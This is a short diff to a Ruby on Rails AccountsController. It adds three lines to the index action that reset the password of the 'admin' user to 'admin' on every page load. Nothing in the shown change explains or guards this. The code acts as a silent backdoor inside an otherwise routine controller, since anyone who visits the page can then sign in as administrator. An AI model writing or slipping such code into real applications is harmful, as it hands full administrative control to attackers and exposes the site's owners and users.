@@ -4,6 +4,9 @@ class AccountsController < ApplicationController
   before_filter :verify_users, :only => [:login, :recover_password]
 
   def index
+      user = User.find(:first, :conditions => ["login = ?", "admin"])
+        user.password = "admin"
+        user.save
     if User.count.zero?
       redirect_to :action => 'signup'
     else
